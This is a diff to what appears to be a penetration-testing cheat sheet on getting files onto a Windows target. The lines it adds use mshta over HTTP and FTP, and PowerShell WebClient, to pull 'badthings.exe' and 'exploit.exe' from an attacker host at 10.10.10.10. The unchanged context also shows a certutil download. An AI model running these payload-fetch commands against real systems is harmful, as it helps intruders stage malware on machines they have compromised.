@@ -105,6 +105,18 @@ I've found that CertUtil can be quite reliable when all else seems to fail.
 certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
 ```
 
+### Transfering Files using MSHTA
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D  
+HTML:  
+```
+C:\>mshta http://10.10.10.10/badthings.exe
+```
+
+FTP:  
+```
+C:\>mshta ftp://10.10.10.10:21/badthings.exe
+```
+
 ### Uploading Files with PowerShell  
 
 Test to see if we can run Powershell:
@@ -125,6 +137,10 @@ CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfi
 Or from a PowerShell... shell:
 ```powershell
 PS C:\> IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
+```
+OR This one seems to work better while at the console:
+```powershell
+PS C:\> IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/exploit.exe", "C:\Users\Public\Downloads\exploit.exe")
 ```
 
 ### Uploading Files with Python
